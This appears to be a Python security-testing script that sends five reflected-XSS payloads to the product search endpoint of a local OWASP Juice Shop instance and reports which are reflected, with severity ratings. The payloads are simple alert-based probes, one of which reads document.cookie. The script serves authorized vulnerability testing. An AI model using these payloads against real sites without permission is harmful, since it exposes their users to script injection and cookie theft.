#!/usr/bin/env python3
"""
Authorized local security test: reflected XSS on OWASP Juice Shop product search.

Tests GET /rest/products/search?q= and reports reflection + severity.
"""

from __future__ import annotations

import argparse
import sys
import urllib.parse
from dataclasses import dataclass
from typing import Iterable

try:
    import requests
except ImportError:
    print("Install dependencies: pip install requests", file=sys.stderr)
    sys.exit(1)

DEFAULT_BASE_URL = "http://localhost:3000"
SEARCH_PATH = "/rest/products/search"

XSS_PAYLOADS: tuple[str, ...] = (
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(document.cookie)</script>',
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
)


@dataclass
class TestResult:
    payload: str
    reflected: bool
    severity: str
    reflection_label: str


def build_search_url(base_url: str, payload: str) -> str:
    base = base_url.rstrip("/")
    encoded = urllib.parse.quote(payload, safe="")
    return f"{base}{SEARCH_PATH}?q={encoded}"


def payload_in_response(payload: str, body: str) -> bool:
    return payload in body


def severity_for(payload: str, reflected: bool) -> str:
    if not reflected:
        return "Low (Mitigated)"
    if "cookie" in payload.lower():
        return "Critical"
    return "High"


def run_test(
    session: requests.Session,
    base_url: str,
    payload: str,
    timeout: float,
) -> TestResult:
    url = build_search_url(base_url, payload)
    reflected = False
    try:
        response = session.get(url, timeout=timeout)
        reflected = response.ok and payload_in_response(payload, response.text)
    except requests.RequestException:
        reflected = False

    return TestResult(
        payload=payload,
        reflected=reflected,
        severity=severity_for(payload, reflected),
        reflection_label="☑ Yes" if reflected else "✘ Filtered",
    )


def run_all(
    base_url: str,
    payloads: Iterable[str],
    timeout: float,
) -> list[TestResult]:
    session = requests.Session()
    session.headers.setdefault(
        "User-Agent",
        "JuiceShop-XSS-Test/1.0 (authorized-local-security-test)",
    )
    return [run_test(session, base_url, p, timeout) for p in payloads]


def print_report(results: list[TestResult]) -> int:
    col_payload = max(len("XSS Payload"), *(len(r.payload) for r in results))
    col_reflected = max(len("Reflected in Response"), 22)
    col_severity = max(len("Severity"), *(len(r.severity) for r in results))

    header = (
        f"{'XSS Payload':<{col_payload}}  "
        f"{'Reflected in Response':<{col_reflected}}  "
        f"{'Severity':<{col_severity}}"
    )
    print(header)
    print("-" * len(header))

    for r in results:
        print(
            f"{r.payload:<{col_payload}}  "
            f"{r.reflection_label:<{col_reflected}}  "
            f"{r.severity:<{col_severity}}"
        )

    return 1 if any(r.reflected for r in results) else 0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Test Juice Shop /rest/products/search for reflected XSS.",
    )
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument(
        "--payload",
        action="append",
        dest="extra_payloads",
        metavar="PAYLOAD",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    payloads = list(XSS_PAYLOADS)
    if args.extra_payloads:
        payloads.extend(args.extra_payloads)

    results = run_all(args.base_url, payloads, args.timeout)
    return print_report(results)


if __name__ == "__main__":
    sys.exit(main())
